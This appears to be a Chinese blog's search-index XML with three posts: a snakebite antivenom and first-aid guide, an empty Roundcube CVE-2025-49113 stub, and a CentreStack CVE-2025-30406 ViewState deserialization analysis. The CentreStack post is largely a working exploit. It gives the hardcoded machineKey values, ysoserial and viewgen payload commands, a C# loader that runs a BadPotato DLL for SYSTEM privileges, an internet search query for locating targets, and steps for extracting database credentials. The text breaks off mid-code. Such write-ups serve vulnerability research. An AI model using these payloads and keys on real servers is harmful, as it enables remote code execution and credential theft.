<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>国内毒蛇血清及被咬后处理方式</title>
      <link href="/2025/06/08/%E8%9B%87%E7%B1%BB/%E6%AF%92%E8%9B%87%E8%A1%80%E6%B8%85/"/>
      <url>/2025/06/08/%E8%9B%87%E7%B1%BB/%E6%AF%92%E8%9B%87%E8%A1%80%E6%B8%85/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文主要整理目前国内毒蛇血清和一些紧急处理手段，内容来源于网络，如有错误请通过邮箱联系我修正。</p></blockquote><h2 id="当地血清医院"><a href="#当地血清医院" class="headerlink" title="当地血清医院"></a>当地血清医院</h2><p>如果快速寻找当地具备相关血清的医院？</p><ul><li>微信小程序：<strong>赛伦100蛇伤防治</strong></li></ul><h2 id="国内血清种类"><a href="#国内血清种类" class="headerlink" title="国内血清种类"></a>国内血清种类</h2><table><thead><tr><th>类型</th><th>介绍</th></tr></thead><tbody><tr><td>抗蝮蛇毒血清</td><td>主要中和普通血循毒和少量突触前神经毒</td></tr><tr><td>抗五步蛇毒血清</td><td>主要中和抗凝血型血循毒</td></tr><tr><td>抗银环蛇毒血清</td><td>主要中和突触后神经毒和突触前神经毒</td></tr><tr><td>抗眼镜蛇毒血清</td><td>主要中和细胞毒、突触后神经毒和少量普通血循毒</td></tr></tbody></table><h2 id="蛇伤处理"><a href="#蛇伤处理" class="headerlink" title="蛇伤处理"></a>蛇伤处理</h2><p>该图来源于 [ 中华急诊医学杂志 2024 年 7 月第 33 卷第 7 期 Chin J Emerg Med, July 2024, Vol. 33, No. 7 ] 中国蛇伤救治指南</p><p><img src="/../../images/image-20250608102901568.png" alt="image-20250608102901568"></p><p>如果被咬，我们可以做什么？</p><ul><li>脱离：立即远离发生咬伤的区域，遇有蛇咬住不放时，可用棍棒或其他工具促使其脱离</li><li>认蛇：毒蛇种类，如果不是相关爱好者是不清楚毒蛇种类的，所以如果可以的话拍照片或者记住该蛇特征（ 头型、体纹和颜色 ）。切勿 企图捕杀致伤蛇，避免二次受伤。</li><li>镇定：蛇伤后的紧张、恐慌等会加速血液循环，促进 毒素吸收。尽量保持冷静，平复情绪，因为部分是“干咬”， 且中毒症状需要一定时间才发生，及时救治是可痊愈的。</li><li>呼救：<strong>赛伦100蛇伤防治</strong> 小程序寻找当地医院，拨打 120</li><li>解压：摘掉受伤肢体饰物，如戒指、手镯、手表、脚链，脱去紧身衣袖或裤子等，以免加重局部伤害，伤口可用清 水简单冲洗。</li><li>制动：活动有促进毒素吸收的风险，被毒蛇咬伤后应尽量全身性制动，尤其受伤肢体制动，可用夹板或就地取材固定伤肢以保持制动；伤者保持坐位或斜靠位，受伤部位或肢体处于相对低位（保持在心脏水平以下），以利减少回心血量，减缓毒素吸收或扩散。</li></ul><p>处置禁忌：</p><ul><li>裸手捡拾或 触碰看似死亡的毒蛇</li><li>等待症状发作以确定是否中毒</li><li>用止血带结扎 、用刀去切割伤口（牙痕）、企图用嘴吸出毒素、 用冰敷或将伤口浸入冰水中、饮酒止痛或喝咖啡饮料、用烧灼等方法处理伤口</li></ul><p>目前的确有可以检测蛇毒的手段，但是需要注意的是，有检测手段并不代表就医医院有检测手段。</p><p><img src="/../../images/image-20250608103912567.png" alt="image-20250608103912567"></p><h2 id="目前国内无血清的危险毒蛇"><a href="#目前国内无血清的危险毒蛇" class="headerlink" title="目前国内无血清的危险毒蛇"></a>目前国内无血清的危险毒蛇</h2><h3 id="泰国圆斑蝰"><a href="#泰国圆斑蝰" class="headerlink" title="泰国圆斑蝰"></a>泰国圆斑蝰</h3><blockquote><p>注：命名是因为泰国发现而不是说只分布在泰国，该蛇泰国多所以泰国有相关血清，但是国内目前没有</p></blockquote><p>蝰科圆斑蝰属，又称百步金钱豹、金钱斑、圆斑蝰。身体全长1.2米左右。</p><p>特征：头较大，略呈三角形，头颈区分明显，没有颊窝；体粗壮而尾短。体尾背面棕揭色，有 3 行镶黄边的深色大圆斑纵贯全身。</p><ul><li>别名金钱斑，可以看到它的身体上的花纹就是铜钱模样的原斑</li></ul><p>国内分布：广东、福建、广西、台湾、云南</p><p>毒素类型：以血循毒为主的混合毒</p><p><img src="/../../images/resize,m_lfit,limit_1,w_536.png" alt="img"></p><p><img src="/../../images/resize,m_lfit,limit_1,h_336.png" alt="img"></p><p><img src="/../../images/resize,m_lfit,limit_1,h_1080.png" alt="img"></p><p><img src="/../../images/resize,m_lfit,limit_1,h_1080-17493514419714.png" alt="泰国圆斑蝰"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://icuguideline.com/wp-content/uploads/2024/07/%E4%B8%AD%E5%9B%BD%E8%9B%87%E4%BC%A4%E6%95%91%E6%B2%BB%E6%8C%87%E5%8D%97.pdf">https://icuguideline.com/wp-content/uploads/2024/07/%E4%B8%AD%E5%9B%BD%E8%9B%87%E4%BC%A4%E6%95%91%E6%B2%BB%E6%8C%87%E5%8D%97.pdf</a></li><li><a href="http://www.kiz.cas.cn/kxcb/kp2/kp22/202201/t20220127_6349842.html">http://www.kiz.cas.cn/kxcb/kp2/kp22/202201/t20220127_6349842.html</a></li><li><a href="https://baike.baidu.com/item/%E6%B3%B0%E5%9B%BD%E5%9C%86%E6%96%91%E8%9D%B0/62732511">https://baike.baidu.com/item/%E6%B3%B0%E5%9B%BD%E5%9C%86%E6%96%91%E8%9D%B0/62732511</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 爱好 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 毒蛇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-49113 Roundcube Webmail 反序列化漏洞分析</title>
      <link href="/2025/06/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2025-49113/"/>
      <url>/2025/06/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2025-49113/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：CVE-2025-49113 Roundcube Webmail 认证后反序列化漏洞</p><p>影响版本：version &lt; 1.5.10, version &lt; 1.6.11</p><p>漏洞原理</p><p>项目地址：<a href="https://github.com/roundcube/roundcubemail">https://github.com/roundcube/roundcubemail</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>搭建版本：1.6.10</p><p>可以使用 Docker 搭建：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e ROUNDCUBEMAIL_DEFAULT_HOST=ssl://imap.qq.com <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e ROUNDCUBEMAIL_DEFAULT_PORT=<span class="hljs-number">993</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e ROUNDCUBEMAIL_SMTP_SERVER=tls://imap.qq.com <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e ROUNDCUBEMAIL_SMTP_PORT=<span class="hljs-number">587</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">8000</span>:<span class="hljs-number">80</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -d roundcube/roundcubemail:<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">10</span>-apache<br></code></pre></td></tr></table></figure><p>这里使用的是 QQ 邮箱，登录的时候需要通过授权吗登录。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-30406 CentreStack ViewState 反序列化漏洞分析</title>
      <link href="/2025/05/18/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2025-30406/"/>
      <url>/2025/05/18/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2025-30406/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：CVE-2025-30406 CentreStack ViewState 反序列化漏洞</p><p>漏洞原理：CentreStack 存在硬编码的 machineKey, 导致 ViewState 反序列化漏洞。</p><p>影响产品：Gladinet CentreStack 和 Triofox</p><p>产品介绍：CentreStack 是 Gladinet 的主要移动访问和安全共享解决方案。来自包括美国、加拿大、英国、澳大利亚、荷兰、瑞士等49个国家的数千家企业使用CentreStack。通过CentreStack，这些企业解决了数据所有权、数据隐私和数据安全问题，同时为其员工引入了一个安全的文件共享解决方案。</p><p>搜索语法：response:”&#x2F;portal&#x2F;loginpage.aspx” AND response:”__VIEWSTATEGENERATOR”</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载：<a href="https://www.centrestack.com/p/gce_latest_release.html">https://www.centrestack.com/p/gce_latest_release.html</a></p><p>版本：16.1.10296.56315</p><p>windows server exe 安装即可</p><p><img src="/../../images/image1-17493518559951.png" alt="图片"></p><h2 id="ViewState-反序列化"><a href="#ViewState-反序列化" class="headerlink" title="ViewState 反序列化"></a>ViewState 反序列化</h2><h3 id="ViewState-介绍"><a href="#ViewState-介绍" class="headerlink" title="ViewState 介绍"></a>ViewState 介绍</h3><p><strong>ViewState</strong> 是 ASP.NET WebForms 中用于<strong>在客户端保存控件状态</strong>的一种机制。它允许在页面回发（PostBack）时，服务器可以重新还原控件的上一次状态，而不需要重新初始化所有数据。</p><p>它一般是以 Base64 编码的形式存储在 HTML 中，例如：</p><p><img src="/../../images/image2.png" alt="图片"></p><h3 id="ViewState-生成恢复过程"><a href="#ViewState-生成恢复过程" class="headerlink" title="ViewState 生成恢复过程"></a>ViewState 生成恢复过程</h3><p>生成过程：控件树 -&gt; SaveViewState -&gt; 序列化 -&gt; (加密) -&gt; （签名） -&gt; Base64 -&gt; HTML输出</p><ol><li><p>控件树生成：用户访问 <code>.aspx</code> 页面时，ASP.NET 解析页面，构建控件树（Page + 各种 Server 控件），控件持有属性状态（如 Text、Value、Checked）。 </p></li><li><p>保存控件状态：每个控件调用 <code>SaveViewState()</code>，将自己的状态保存到（可选）（轻量数据结构）。 </p></li><li><p>对象树序列化：使用 <code>LosFormatter</code> 或 <code>ObjectStateFormatter</code>，将对象树序列化成字节流。 </p></li><li><p>加密（可选）：如果启用，使用 AES 加密字节流，密钥来自 <code>web.config</code> 中的 machineKey（decryptionKey）。 </p></li><li><p>签名（可选）：用 HMACSHA1 或 HMACSHA256，结合 validationKey，对数据进行签名，防篡改。 </p></li><li><p>Base64 编码输出：最后将字节流Base64编码，嵌入页面的 <code>&lt;input type=&quot;hidden&quot; id=&quot;__VIEWSTATE&quot; /&gt;</code>。</p></li></ol><p>将 ViewState 恢复到控件的过程：接收 HTML -&gt; Base64解码 -&gt; （验证签名） -&gt; (解密) -&gt; 反序列化 -&gt; LoadViewState</p><h3 id="ViewState-反序列化-1"><a href="#ViewState-反序列化-1" class="headerlink" title="ViewState 反序列化"></a>ViewState 反序列化</h3><p>从上面恢复的过程可以看出，一旦泄露了加密和签名所使用的算法和密钥，我们就可以构造恶意的 ViewState 实现反序列化攻击。</p><p>加密和签名序列化数据所用的算法和密钥存放在 web.config  。该漏洞就是由于 web.config 中配置的算法和密钥是固定的，我们可以本地搭建环境获取其密钥然后构造反序列化 Payload。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境搭建完毕可以在 “C:\Program Files (x86)\Gladinet Cloud Enterprise\root\web.config” 中可以找到 ViewState 密钥。</p><p><img src="/../../images/image3.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">decryption=&quot;AES&quot; <br>decryptionKey=&quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; <br>validationKey=&quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot;<br></code></pre></td></tr></table></figure><p>随后可以使用 viewgen 工具进行验证：<br>获取登陆页面中的 __VIEWSTATE 和 __VIEWSTATEGENERATOR：</p><p><img src="/../../images/image4.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">docker run 0xacb/viewgen --decode --check --modifier 3FE2630A &quot;/wEPDwUJLTc5MTM0MzY1DxYCHhNDU1JGVG9rZW4xNTk5MTIwOTM2BSRmN2JkYTAwMC01YjNlLTQ2MWMtODUyYy04MDhlOWM5YWI4YzQWAmYPZBYCAgEPZBYCAgEPZBYEAgQPZBYIZg8PFgIeCEltYWdlVXJsBRVpbWFnZXMvdGVhbWNsb3VkMi5qcGdkZAIBDw8WAh8BBRhpbWFnZXMvY2VudHJlc3RhY2tfbC5wbmdkZAICD2QWBgICDw8WAh4HVG9vbFRpcAUJVXNlciBOYW1lFgIeC3BsYWNlaG9sZGVyBQlVc2VyIE5hbWVkAgYPZBYCAgEPDxYCHwIFCFBhc3N3b3JkFgIfAwUIUGFzc3dvcmRkAgoPDxYEHgtOYXZpZ2F0ZVVybAUPR0Nsb3VkUGxhbi5hc3B4HgdWaXNpYmxlaGRkAgsPDxYCHgRUZXh0ZGRkAgoPDxYCHwYFC0NlbnRyZVN0YWNrZGRkMTmsZSWav/7DTVPhcB8+QA8OWceS26J2YazzfcBTmT8=&quot; --vkey &quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --valg SHA256 --dkey &quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --dalg &quot;AES&quot; <br></code></pre></td></tr></table></figure><p>可以成功解码：<br><img src="/../../images/image5.png" alt="图片"><br>命令执行测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">docker run 0xacb/viewgen --command &quot;cmd /c ipconfig &gt; C:\Windows\Temp\ipconfig.txt&quot; --modifier 3FE2630A &quot;/wEPDwUJLTc5MTM0MzY1DxYCHhNDU1JGVG9rZW4xNTk5MTIwOTM2BSRmN2JkYTAwMC01YjNlLTQ2MWMtODUyYy04MDhlOWM5YWI4YzQWAmYPZBYCAgEPZBYCAgEPZBYEAgQPZBYIZg8PFgIeCEltYWdlVXJsBRVpbWFnZXMvdGVhbWNsb3VkMi5qcGdkZAIBDw8WAh8BBRhpbWFnZXMvY2VudHJlc3RhY2tfbC5wbmdkZAICD2QWBgICDw8WAh4HVG9vbFRpcAUJVXNlciBOYW1lFgIeC3BsYWNlaG9sZGVyBQlVc2VyIE5hbWVkAgYPZBYCAgEPDxYCHwIFCFBhc3N3b3JkFgIfAwUIUGFzc3dvcmRkAgoPDxYEHgtOYXZpZ2F0ZVVybAUPR0Nsb3VkUGxhbi5hc3B4HgdWaXNpYmxlaGRkAgsPDxYCHgRUZXh0ZGRkAgoPDxYCHwYFC0NlbnRyZVN0YWNrZGRkMTmsZSWav/7DTVPhcB8+QA8OWceS26J2YazzfcBTmT8=&quot; --vkey &quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --valg SHA256 --dkey &quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --dalg &quot;AES&quot; <br></code></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/jMW4Xxdkqvd6E6Cx.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br><img src="/../../images/image8.png" alt="图片"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>当前的命令执行是 IIS 的权限，我们可以利用土豆提权到 System 。可以通过 ActivitySurrogateSelectorFromFile 利用链来实现。该链可以做到代码执行，这里可以通过加载土豆提权的 dll 实现权限提升。</p><p>这里使用 Godzilla 中的 BadPotato.dll 做好了 HTTP 相关的封装我们可以直接在这里使用：</p><p>添加 cmd 参数调用 ToString 方法后从 result 获取结果</p><p><img src="/../../images/image9.png" alt="图片"><br>代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Collections;<br><span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">using</span> System.Reflection;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Web;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">E</span><br>&#123;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">Run</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br><span class="hljs-comment">// 通过 HTTP 获取 badPotatoDll 并加载</span><br>            <span class="hljs-built_in">string</span> base64Dll = HttpContext.Current.Request.Form[<span class="hljs-string">&quot;x&quot;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(base64Dll))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br>            <span class="hljs-built_in">byte</span>[] dllBytes = Convert.FromBase64String(base64Dll);<br>            Assembly assembly = Assembly.Load(dllBytes);<br><span class="hljs-comment">// Run 类</span><br>            Type runType = assembly.GetType(<span class="hljs-string">&quot;BadPotato.Run&quot;</span>);<br>            <span class="hljs-keyword">if</span> (runType == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br>            <span class="hljs-built_in">object</span> instance = Activator.CreateInstance(runType);<br><span class="hljs-comment">// 添加参数</span><br>            <span class="hljs-keyword">var</span> parametersField = runType.GetField(<span class="hljs-string">&quot;parameters&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);<br>            <span class="hljs-keyword">if</span> (parametersField == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br>            HttpContext context = HttpContext.Current;<br>            Hashtable parameters = <span class="hljs-keyword">new</span> Hashtable();<br>            parameters.Add(<span class="hljs-string">&quot;cmd&quot;</span>, Encoding.Default.GetBytes(context.Request.Form[<span class="hljs-string">&quot;c&quot;</span>]));   <br>            parametersField.SetValue(instance, parameters);<br>            <span class="hljs-comment">// 执行 toString 方法触发权限提升命令执行</span><br>            instance.ToString();<br><span class="hljs-comment">// 获取结果</span><br>            <span class="hljs-keyword">var</span> resultField = parameters[<span class="hljs-string">&quot;result&quot;</span>];<br>            <span class="hljs-keyword">if</span> (resultField != <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> Encoding.Default.GetString((<span class="hljs-built_in">byte</span>[])resultField);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">E</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            HttpContext context = HttpContext.Current;<br>            context.Server.ClearError();<br>            context.Response.Clear();<br>            context.Response.Write(Run());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (System.Exception ex)<br>        &#123;<br>            HttpContext.Current.Response.Write(<span class="hljs-string">&quot;Error: &quot;</span> + HttpUtility.HtmlEncode(ex.ToString()));<br>        &#125;<br>        HttpContext.Current.Response.Flush();<br>        HttpContext.Current.Response.End();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile  --decryptionkey=&quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --validationkey=&quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --generator=3FE2630A -c &quot;CentreStack.BadPotato.cs;System.dll;System.Web.dll;System.Data.dll;System.Xml.dll;System.Runtime.Extensions.dll;&quot;<br></code></pre></td></tr></table></figure><p><img src="/../../images/image10.png" alt="图片"></p><p><img src="https://uploader.shimo.im/f/tWTdOxYVifk8YVqK.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"></p><h3 id="获取数据库配置"><a href="#获取数据库配置" class="headerlink" title="获取数据库配置"></a>获取数据库配置</h3><p>在 CentreStack 的根目录有一个 ChangeDBSettings.exe，反编译可以找到其数据库连接信息的存储位置。</p><p><img src="https://uploader.shimo.im/f/K95nXfw8zPACgnfW.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"></p><p><img src="https://uploader.shimo.im/f/ngv87Q8GzmYkMlD8.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"></p><p><img src="/../../images/image14.png" alt="图片"><br><img src="https://uploader.shimo.im/f/NdRLCaoCavuIKiuO.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br>可以看到其更新数据库配置其实就是去修改注册表 SOFTWARE\Gladinet\Enterprise 中的值。</p><p>密码是加密后存储的，但是使用的是 AES 我们可以进行解密。</p><p><img src="/../../images/image16.png" alt="图片"></p><p>不过在本地搭建环境中发现是存储在 DBConn 中的，可能手动修改后才是 ChangeDBSettings 中的那样。</p><p><img src="/../../images/image17.png" alt="图片"></p><p>根据这个就可以去构造 Payload 获取对方数据库的配置信息了。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span 